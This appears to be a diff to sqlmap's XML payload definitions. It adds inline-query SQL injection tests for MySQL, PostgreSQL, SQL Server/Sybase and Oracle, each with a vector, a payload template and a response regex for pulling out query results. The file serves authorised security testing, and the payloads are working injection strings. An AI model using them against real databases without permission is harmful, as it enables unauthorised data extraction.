@@ -73,7 +73,7 @@ Tag: <test>
         Valid values:
             0: Heuristic check to parse response errors
             1: Boolean-based blind SQL injection
-            2: Error-based SQL injection
+            2: Error-based/Inline queries SQL injection
             3: UNION query SQL injection
             4: Stacked queries SQL injection
             5: Time-based blind SQL injection
@@ -1897,6 +1897,86 @@ Formats:
     -->
     <!-- End of error-based tests - GROUP BY and ORDER BY clauses -->
 
+
+    <!-- Inline queries tests -->
+    <test>
+        <title>MySQL inline queries</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>(SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL inline queries</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase inline queries</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle inline queries</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT ('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]') FROM DUAL)</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]' FROM DUAL)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+    <!-- End of inline queries tests -->
 
     <!-- Stacked queries tests -->
     <test>
